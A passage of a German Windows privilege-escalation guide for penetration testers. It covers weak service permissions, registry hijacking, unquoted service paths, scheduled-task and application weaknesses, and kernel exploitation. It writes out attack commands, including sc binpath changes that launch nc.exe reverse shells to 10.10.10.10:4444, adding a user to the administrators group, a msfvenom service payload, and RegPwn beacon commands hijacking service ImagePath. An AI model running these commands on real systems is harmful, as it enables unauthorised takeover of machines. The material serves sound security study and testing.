accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Sie können accesschk.exe für XP hier herunterladen](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Dienst aktivieren

Wenn dieser Fehler auftritt (zum Beispiel bei SSDPSRV):

_Systemfehler 1058 ist aufgetreten._\
_Der Dienst kann nicht gestartet werden, da er deaktiviert ist oder keine aktivierten Geräte mit ihm verknüpft sind._

Sie können ihn mit folgendem Befehl aktivieren.

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Beachte, dass der Dienst upnphost (unter XP SP1) von SSDPSRV abhängig ist**

**Eine weitere Möglichkeit, dieses Problem zu umgehen,** ist die Ausführung von:

```
sc.exe config usosvc start= auto
```

### **Dienst-Binärpfad ändern**

Wenn die Gruppe „Authenticated Users“ über **SERVICE_ALL_ACCESS** für einen Dienst verfügt, kann die ausführbare Binärdatei des Dienstes geändert werden. So änderst und ausführst du `sc`:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Dienst neu starten

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Privileges können über verschiedene Berechtigungen eskaliert werden:

- **SERVICE_CHANGE_CONFIG**: Ermöglicht die Neukonfiguration der Service-Binärdatei.
- **WRITE_DAC**: Ermöglicht die Neukonfiguration von Berechtigungen und damit das Ändern von Service-Konfigurationen.
- **WRITE_OWNER**: Ermöglicht die Übernahme des Besitzes und die Neukonfiguration von Berechtigungen.
- **GENERIC_WRITE**: Beinhaltet ebenfalls die Möglichkeit, Service-Konfigurationen zu ändern.
- **GENERIC_ALL**: Beinhaltet ebenfalls die Möglichkeit, Service-Konfigurationen zu ändern.

Zur Erkennung und Ausnutzung dieser Schwachstelle kann _exploit/windows/local/service_permissions_ verwendet werden.

### Schwache Berechtigungen für Service-Binärdateien

Wenn ein Service als **`LocalSystem`**, **`LocalService`**, **`NetworkService`** oder unter einem privilegierten Domänenkonto ausgeführt wird, aber **Benutzer mit niedrigen Berechtigungen die Service-EXE oder deren übergeordneten Ordner ändern können**, lässt sich der Service oft kapern, indem **die Binärdatei ersetzt und der Service neu gestartet wird**.

**Prüfe, ob du die von einem Service ausgeführte Binärdatei ändern kannst** oder ob du **Schreibberechtigungen für den Ordner hast**, in dem sich die Binärdatei befindet ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Mit **wmic** (nicht in system32) kannst du alle von einem Service ausgeführten Binärdateien abrufen und deine Berechtigungen mit **icacls** prüfen:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Du kannst auch **sc** und **icacls** verwenden:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Achte auf gefährliche ACLs für **`Everyone`**, **`BUILTIN\Users`** oder **`Authenticated Users`**, insbesondere auf **`(F)`**, **`(M)`** oder **`(W)`** für die ausführbare Dienstdatei oder das Verzeichnis, in dem sie liegt. Ein praktischer Ablauf für den Missbrauch:<sup>[[27]](#references)</sup>

1. Bestätige das Dienstkonto und den Pfad der ausführbaren Datei mit `sc qc <service_name>`.
2. Prüfe mit `icacls <path>`, ob die Binärdatei beschreibbar ist.
3. Ersetze die Dienstdatei durch einen Payload oder eine gültige schädliche Dienstdatei.
4. Starte den Dienst mit `sc stop <service_name> && sc start <service_name>` neu (oder warte auf einen Neustart bzw. einen Diensttrigger).

Nützliche automatisierte Prüfungen:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Wenn der Dienst einem normalen Benutzer keinen Neustart erlaubt, prüfe, ob er beim Booten automatisch gestartet wird, eine Fehleraktion hat, die ihn erneut startet, oder indirekt von der Anwendung ausgelöst werden kann, die ihn verwendet.

### Änderungsberechtigungen für Dienstregistrierungsschlüssel

Du solltest prüfen, ob du Registrierungsschlüssel von Diensten ändern kannst.\
Du kannst deine **Berechtigungen** für einen **Dienstregistrierungsschlüssel** folgendermaßen **prüfen**:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Der ursprüngliche Berechtigungstest lautete:

Es sollte geprüft werden, ob **Authenticated Users** oder **NT AUTHORITY\INTERACTIVE** über `FullControl`-Berechtigungen verfügen. Wenn ja, kann die vom Dienst ausgeführte Binärdatei geändert werden.

Prüfe, ob **Authenticated Users** oder **NT AUTHORITY\INTERACTIVE** über Schreibberechtigungen für einen bestimmten Dienstschlüssel in der Registry verfügen. Ein ACL-Eintrag allein beweist keinen effektiven Zugriff: Deny-Einträge, das aktuelle Token und geerbte Berechtigungen spielen ebenfalls eine Rolle. Die Berechtigungen für Registry-Schlüssel sind unabhängig von den Rechten `SERVICE_CHANGE_CONFIG` und `SERVICE_START` für das Dienstobjekt. Für eine Privilegienerweiterung sind außerdem ein nutzbares Dienstkonfigurationsfeld, eine Möglichkeit zum Auslösen des Dienstes und eine privilegiertere Dienstidentität erforderlich. Siehe Microsofts [registry-key rights](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) und [service access-rights reference](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

So änderst du den Path der ausgeführten Binärdatei:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Registry symlink race zum Schreiben beliebiger HKLM-Werte (ATConfig)

Einige Windows-Barrierefreiheitsfeatures erstellen benutzerspezifische **ATConfig**-Schlüssel, die später von einem **SYSTEM**-Prozess in einen HKLM-Sitzungsschlüssel kopiert werden. Eine Registry-**symbolic link race** kann diesen privilegierten Schreibvorgang in einen beliebigen **HKLM-Pfad** umleiten und so eine Primitive zum Schreiben beliebiger **HKLM-Werte** bereitstellen.<sup>[[18]](#references)</sup>

Wichtige Speicherorte (Beispiel: Bildschirmtastatur `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` listet installierte Barrierefreiheitsfeatures auf.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` speichert benutzergesteuerte Konfiguration.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` wird bei der Anmeldung bzw. beim Wechsel zum Secure Desktop erstellt und ist für den Benutzer beschreibbar.

Ablauf des Missbrauchs (CVE-2026-24291 / ATConfig):

1. Lege den **HKCU-ATConfig**-Wert fest, der von SYSTEM geschrieben werden soll.
2. Löse das Kopieren zum Secure Desktop aus (z. B. mit **LockWorkstation**), wodurch der AT-Broker-Ablauf gestartet wird.
3. **Gewinne die race**, indem du ein **oplock** auf `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` setzt. Wenn das oplock ausgelöst wird, ersetze den **HKLM-Session-ATConfig**-Schlüssel durch einen **Registry-Link** auf ein geschütztes HKLM-Ziel.
4. SYSTEM schreibt den vom Angreifer gewählten Wert in den umgeleiteten HKLM-Pfad.

Sobald du beliebige HKLM-Werte schreiben kannst, kannst du für LPE Service-Konfigurationswerte überschreiben:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/Befehlszeile)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Wähle einen Dienst, den ein normaler Benutzer starten kann (z. B. **`msiserver`**), und starte ihn nach dem Schreibvorgang. **Hinweis:** Die öffentliche Exploit-Implementierung **sperrt die Workstation** als Teil der race.

Beispiel-Tools (RegPwn BOF / Standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### AppendData/AddSubdirectory-Berechtigungen für den Services-Registry-Schlüssel

Wenn du diese Berechtigung für einen Registry-Schlüssel hast, bedeutet das, dass du **darunter Unterschlüssel erstellen kannst**. Bei Windows-Diensten reicht das aus, um **beliebigen Code auszuführen:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Nicht in Anführungszeichen gesetzte Service-Pfade

Wenn der Pfad zu einer ausführbaren Datei nicht in Anführungszeichen steht, versucht Windows, jede mögliche Zeichenfolge vor einem Leerzeichen auszuführen.

Bei dem Pfad _C:\Program Files\Some Folder\Service.exe_ versucht Windows beispielsweise, Folgendes auszuführen:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Liste alle nicht in Anführungszeichen gesetzten Dienstpfade auf, mit Ausnahme derjenigen, die zu integrierten Windows-Diensten gehören:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Du kannst diese Schwachstelle mit metasploit erkennen und exploiten**: `exploit/windows/local/trusted\_service\_path` Du kannst manuell mit metasploit eine Dienst-Binärdatei erstellen:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Wiederherstellungsaktionen

Windows ermöglicht es Benutzern, Aktionen festzulegen, die ausgeführt werden, wenn ein Dienst ausfällt. Diese Funktion kann so konfiguriert werden, dass sie auf eine Binärdatei verweist. Wenn diese Binärdatei ersetzt werden kann, ist möglicherweise privilege escalation möglich. Weitere Informationen finden Sie in der [offiziellen Dokumentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Skriptziele geplanter Aufgaben

Prüfen Sie bei einer aktivierten Aufgabe, die `cmd.exe /c` mit einer `.bat`- oder `.cmd`-Datei ausführt, sowohl das in den **Aktionsargumenten** angegebene Skript als auch `cmd.exe`. Dasselbe gilt für ein explizites Dateiargument eines Interpreters, beispielsweise PowerShell `-File`. Wenn eine geplante Batchdatei einen wörtlichen PowerShell-Aufruf mit `-File` enthält, prüfen Sie auch die ACL des referenzierten Skripts; Variablen, Bedingungen und Shell-Verkettungen müssen manuell nachvollzogen werden. Ein für den aufrufenden Benutzer beschreibbares Skript oder übergeordnetes Verzeichnis ist nur dann ein Ansatzpunkt für die Ausführung unter einem anderen Konto, wenn sich der konfigurierte Aufgabenprinzipal vom aufrufenden Benutzer unterscheidet und die Aufgabe tatsächlich diese Aktion erreicht. Eine ACL, die nur das Anhängen von Inhalten erlaubt, kann bei Skripten relevant sein, aber ein vorangehendes `exit` oder ein anderer Kontrollfluss kann angehängte Zeilen unerreichbar machen. Bestätigen Sie die effektiven ACLs, den [Aufgabenausführungskontext](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), das Arbeitsverzeichnis, den Trigger und die Richtlinie zur Anwendungskontrolle, bevor Sie von privilege escalation ausgehen. Die Bestandsaufnahme sollte weder das Skript ändern noch die Aufgabe starten.

## Benannte Streams in zugänglichen Dateien

Unter NTFS kann eine lesbare Datei einen benannten `:$DATA`-Stream enthalten, dessen Inhalt in einer gewöhnlichen Verzeichnisauflistung nicht angezeigt wird. Prüfen Sie bei einer kleinen, relevanten Auswahl zugänglicher Sicherungs- oder Konfigurationsdateien zunächst die **Namen und Größen** der Streams, bevor Sie Inhalte öffnen. Windows stellt diese über [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) und PowerShell über [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item) bereit. Ein Streamname, der auf ein Geheimnis hindeutet, ist lediglich ein Ansatzpunkt. Prüfen Sie den effektiven Lesezugriff auf die Datei, die Stream-Unterstützung des Dateisystems, ob der Stream nutzbare Zugangsdaten enthält und bei welchem Konto diese tatsächlich zur Authentifizierung dienen. Vermeiden Sie bei der routinemäßigen Aufzählung rekursive Stream-Scans und die Ausgabe von Stream-Inhalten.

## Eingaben für geplante Windows Driver Kit-Hilfsprogramme

Das optionale Windows Driver Kit enthält `StandaloneRunner.exe`, das aus seinem Ausführungsverzeichnis die Dateien `command.txt`, `reboot.rsf` und eine Projektdatei `working\rsf.rsf` verwenden kann. Eine geplante Aufgabe oder ein Dienst, der dieses Hilfsprogramm mit einem privilegierten Konto startet, kann Schreibzugriff auf diese Eingabedateien mit niedrigen Berechtigungen in Befehlsausführung im Kontext dieses Kontos umwandeln, selbst wenn die ausführbare Datei des Hilfsprogramms geschützt ist. Bestätigen Sie, dass ein privilegierter Prozess die Dateien verwendet und dass **beide** Begleitdateien erstellt oder geändert werden können; allein der Fund des Hilfsprogramms reicht nicht aus.

Prüfen Sie bei einer geplanten Aufgabe die [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory)-Eigenschaft ihrer Aktion sowie die ACLs der beiden Begleitdateipfade. Wenn für die Aufgabe kein Arbeitsverzeichnis angegeben ist, ist das Verzeichnis der ausführbaren Datei lediglich ein Ansatzpunkt, der überprüft werden muss, und kein Beweis dafür, von wo die Aufgabe ihre Eingaben liest. Außerdem muss die Voraussetzung für die Projekt-Arbeitsdatei erfüllt sein. Prüfen Sie den tatsächlichen Aufgabenprinzipal, statt anzunehmen, dass die Aufgabe als SYSTEM ausgeführt wird.

## Anwendungen

### Installierte Anwendungen

Prüfen Sie die **Berechtigungen der Binärdateien** (vielleicht können Sie eine davon überschreiben und privilege escalation erreichen) sowie der **Ordner** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Checkmk-Windows-Agent-Reparaturpfad

[CVE-2024-0670](https://checkmk.com/werk/16361) betrifft ältere Checkmk-Windows-Agents, die Befehlsdateien in `C:\Windows\Temp` geschrieben und anschließend eine bereits vorhandene, schreibgeschützte Datei ausgeführt haben, wenn das Ersetzen fehlschlug. Der Anbieter hat das Problem in 2.1.0p40, 2.2.0p23, 2.3.0b1 und 2.4.0b1 behoben. Prüfen Sie den vollständigen installierten Patchstand und ob die betroffene Agent-Operation ausgeführt werden kann; eine reine Versionsangabe wie `2.1` reicht nicht aus, um eine Gefährdung festzustellen. Bei der Enumeration können Version, Dienststatus und Temp-Berechtigungen geprüft werden, ohne Dateien zu erstellen oder Agent-Befehle auszulösen.

#### Überprüfung des ADSelfService-Plus-SAML-Dienstes

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) betraf ADSelfService Plus Build 6210 und ältere Versionen; der Anbieter hat das Problem in Build 6211 behoben. Die Schwachstelle ist nur relevant, wenn SAML SSO **aktiviert ist oder war**. Ein installierter Produkteintrag oder Dienstpfad ist daher ein Ansatzpunkt, aber kein Nachweis für eine Schwachstelle: Bestätigen Sie den genauen Build, den Verlauf der SAML-Konfiguration, die Netzwerk-Erreichbarkeit des Dienstes und das Konto, unter dem er ausgeführt wird. Codeausführung über den Dienst übernimmt die Berechtigungen dieses Kontos; eine Ausführung als SYSTEM erfordert eine Instanz, die als SYSTEM läuft. Eine lesbare `OfflineBackup_*.ezip` im Backup-Verzeichnis des Produkts ist ein separater Hinweis auf ein verschlüsseltes Backup, aber kein Beleg für verwendbare Anmeldedaten oder diese SAML-Schwachstelle. Erfassen Sie Pfad und Zugriffsrechte, ohne die Datei bei der routinemäßigen Enumeration zu entpacken.

#### Jenkins-Controller und Grenzen von Domänenkonten

Unterscheiden Sie auf einem Windows-Jenkins-Controller zwischen der Berechtigung, einen Job zu erstellen oder zu konfigurieren, und der Berechtigung, ihn zu starten: [Jenkins dokumentiert diese als separate Rechte `Job/Create`, `Job/Configure` und `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Ein konfigurierter Zeitplan oder ein Remote-Trigger kann einen weiteren Weg zum Ausführen eines Builds bieten; bestätigen Sie jedoch, dass er aktiviert ist und der Build tatsächlich läuft. Die Ausführung erfolgt mit der Identität des Controllers oder des ausgewählten Agents. Auf gespeicherte Anmeldedaten kann nur zugegriffen werden, wenn der Job deren Gültigkeitsbereich nutzen darf. Prüfen Sie außerdem den Zugriff auf die Metadaten in `JENKINS_HOME`: Jenkins speichert Anmeldedaten und Verschlüsselungsschlüssel in `credentials.xml`, `secrets/hudson.util.Secret` und `secrets/master.key` ([Jenkins-Geheimnisspeicherung](https://www.jenkins.io/doc/developer/security/secrets/)). Ihr bloßes Vorhandensein gibt kein Passwort preis; prüfen Sie den **Lesezugriff auf die erforderlichen Dateien** und einen separaten Pfad zur Wiederverwendung des Kontos, ohne Geheimnisse in gemeinsam genutzten Ausgaben anzuzeigen. Falls dieses Konto Schreibrechte auf das AD-Benutzerobjektattribut `scriptPath` hat, bestätigen Sie einen beschreibbaren Skriptpfad und einen realen Anmelde- oder geplanten Prozess, der als Zielbenutzer läuft, bevor Sie dies als benutzerübergreifende Ausführung einstufen. Weitere Gruppensteuerung erfordert eine separate Bestätigung der effektiven AD-Rechte.

#### Identität eines selbst gehosteten Azure-Pipelines-Agents

Unterscheiden Sie bei einem Azure DevOps Server- oder Azure-Pipelines-Projekt zwischen der Berechtigung, eine Pipeline **zu erstellen oder zu bearbeiten**, und der Berechtigung, sie **in die Warteschlange zu stellen** und den ausgewählten Agent-Pool zu nutzen; [Microsoft dokumentiert Pipeline-Berechtigungen](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) und [Pool-Autorisierung](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) unabhängig voneinander. Wenn ein Konto mit geringeren Berechtigungen einen Skriptschritt einreichen und diese Pipeline auf einem selbst gehosteten Windows-Agent ausführen kann, wird der Schritt als [konfiguriertes Betriebssystemkonto des Agents](https://learn.microsoft.com/azure/devops/pipelines/agents/agents) ausgeführt. Prüfen Sie die genaue Pipeline, Einschränkungen für Branches und Ressourcen, den autorisierten Pool, den ausführbaren Job und die Dienstidentität des Agents, bevor Sie einen Wechsel zu einem anderen Benutzer oder SYSTEM behaupten. Ein installierter Agent, eine Projektrolle oder Schreibrechte auf ein Repository sind allein nur Ansatzpunkte. Prüfen Sie Berechtigungen und lokale Dienstmetadaten, ohne bei der passiven Enumeration einen Build zu starten.

#### Anmeldedaten von Microsoft Entra Connect Sync

[Microsoft unterscheidet](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) zwischen dem **ADSync-Dienstkonto**, unter dem der Synchronisierungsdienst läuft und auf seine SQL-Datenbank zugreift, und dem **AD-DS-Connector-Konto**, dessen Verzeichnisberechtigungen von den konfigurierten Synchronisierungsfunktionen abhängen. Connector-Anmeldedaten werden verschlüsselt in dieser Datenbank gespeichert; das Schlüsselmaterial wird [durch DPAPI unter dem ADSync-Dienstkonto geschützt](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Ein installierter Synchronisierungsdienst, eine Gruppe, deren Name auf lokale Administratorrechte schließen lässt, oder der bloße Datenbankzugriff belegen weder entschlüsselbare Anmeldedaten noch eine Rechteausweitung in der Domäne. Prüfen Sie separat die tatsächlichen Leserechte auf die Datenbank, den Zugriff des Dienstkontos auf den Schlüssel, das Installations- und SQL-Layout, die konfigurierte Connector-Identität und deren effektive AD-Berechtigungen. Bei der routinemäßigen Enumeration sollten nur Dienst- und Zugriffsmetadaten angezeigt werden, nicht die gespeicherten Geheimnisse abgefragt oder ausgegeben werden.

#### Berechtigungen für Druckertreiber-Support-DLLs

Ein installierter Druckertreiber kann Support-DLLs unter `C:\ProgramData` speichern und in einem privilegierteren Druckprozess laden. Prüfen Sie die ACLs des genauen Treiberverzeichnisses und der DLLs, einschließlich übergeordneter Verzeichnisse und Reparse Points, auch wenn die WMI-Enumeration von Druckern verweigert wird. Beim [Problem mit Ricoh-Druckertreibern CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) lautete der angegebene Pfad `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [die ursprüngliche Offenlegung](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) beschreibt das Laden von DLLs durch `PrintIsolationHost.exe`. Eine beschreibbare ACL ist nur ein Ansatzpunkt: Prüfen Sie den effektiven Schreibzugriff unter Berücksichtigung verweigernder Einträge, ob der betreffende Treiber installiert ist und die Datei mit einer privilegierten Identität lädt, und ob ein aktualisierter Treiber oder ein Sicherheitsprogramm des Anbieters die Installation behoben hat. Leiten Sie eine Schwachstelle nicht allein aus dem Verzeichnisnamen oder der Treiberversion ab.

### Schreibberechtigungen

Prüfen Sie, ob Sie eine Konfigurationsdatei ändern können, um eine spezielle Datei zu lesen, oder ob Sie eine Binärdatei ändern können, die von einem Administratorkonto ausgeführt wird (schedtasks).

Eine Möglichkeit, schwache Berechtigungen für Ordner und Dateien auf dem System zu finden, ist:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++-Plugin-Autoload-Persistenz/Ausführung

Notepad++ lädt automatisch jede Plugin-DLL in seinen Unterordnern `plugins`. Wenn eine beschreibbare portable Installation/Kopie vorhanden ist, führt das Ablegen eines schädlichen Plugins bei jedem Start automatisch Code innerhalb von `notepad++.exe` aus (einschließlich aus `DllMain` und Plugin-Callbacks).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Beim Start ausführen

**Prüfe, ob du einen Registry-Eintrag oder eine Binärdatei überschreiben kannst, die von einem anderen Benutzer ausgeführt wird.**\
**Lies** die **folgende Seite**, um mehr über interessante **Autorun-Speicherorte zur Rechteausweitung** zu erfahren:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Treiber

Suche nach möglichen **ungewöhnlichen/verwundbaren Drittanbieter-Treibern**.

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Wenn ein Treiber eine arbitrary kernel read/write primitive bereitstellt (häufig bei schlecht entworfenen IOCTL-Handlern), kannst du durch direktes Stehlen eines SYSTEM-Tokens aus dem Kernel-Speicher deine Privilegien erweitern.<sup>[[13]](#references)</sup> Die Schritt-für-Schritt-Technik findest du hier:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

Verwandte Materialien zur Windows-Kernel-Exploitation:

Ein Beispiel für einen Kernel-Mode-Ring-Buffer mit user-writable Read/Write-Registern findest du in der [USB-MIDI-Looped-Streaming-Variante](../../binary-exploitation/array-indexing.md#kernel-driver-variant-usb-midi-looped-streaming).

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/usb-midi-packet-size-pool-overflow.md
{{#endref}}

#### Cancel-safe-Queue-UAFs, Disclosure von Paged-Pool-Speicher und I/O-Ring-Pivots

Manche Windows-Kernel-LPE-Ketten lassen sich aus zwei für sich genommen schwachen Bugs aufbauen: einer **Lifetime-Race in einer cancel-safe queue**, die eine Request/CBD freigibt, während der Queue-Lock noch gehalten wird, und einer **Disclosure nach Freigabe des Locks**, bei der während `RtlCopyToUser` eine freigegebene Paged-Pool-Allokation geleakt wird.<sup>[[29]](#references)</sup>

Hinweise zu Audit und Exploitation:

- **Freigabe unter Lock + anschließendes Cancel**: Suche nach einem Erfolgs-Pfad mit **Acquire -> CompleteRequest/free -> Release**, während der Cancel-Pfad **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** ausführt. Wenn der Erfolgs-Pfad `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` aufruft, bevor der CBDQ/CSQ-Lock freigegeben wird, kann ein in `NtCancelIoFileEx -> IopCsqCancelRoutine` blockierter Thread später fortfahren und einen freigegebenen `PFLT_CALLBACK_DATA` an den Remove-Callback des Treibers übergeben.
- **Hole das freigegebene Queue-Objekt zurück** – mit einer gleich großen, vom Angreifer kontrollierten Paged-Pool-Allokation. `NPFS` Data Queue Entries eignen sich dafür, weil Payload und Größe kontrollierbar sind und du sie später mit Pipe-Read/Peek-Operationen untersuchen kannst. Wenn das freigegebene Objekt List-Links enthält, überschreibe sie mit einer **zyklischen Liste gefälschter Request-Nodes im User-Speicher**, damit der Treiber wiederholt vom Angreifer definierte Request-Strukturen verarbeitet, statt am ursprünglichen Listenanfang zu enden.
- **Erweitere einen vorhersehbaren Write**: Wenn der gefälschte Request einen verschachtelten Kontextzeiger umleitet, der für Bookkeeping-Writes verwendet wird (Zeitstempel / QPC / benachbarte Refcount-Felder), erhältst du möglicherweise einen **adresskontrollierten, aber nicht wertkontrollierten** Kernel-Write. Ziele in diesem Fall auf das **length/size**-Feld eines gesprayten Pool-Objekts statt auf einen finalen Code-/Datenzeiger und durchsuche anschließend den Spray, bis das beschädigte Objekt einen **Out-of-Bounds-Read aus dem Paged-Pool** ermöglicht.
- **Racebare Disclosure**: Jeder Systemaufruf nach dem Muster `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` ist ein aussichtsreicher Kandidat. Die Zuverlässigkeit steigt, wenn der Angreifer den kopierten Buffer vergrößern kann (etwa durch viele Listen-/Ressourceneinträge, die die finale Allokationsgröße eines Serializers erhöhen), denn ein längerer Copy vergrößert das Replacement-Fenster, ohne zwangsläufig einen Systemabsturz auszulösen.
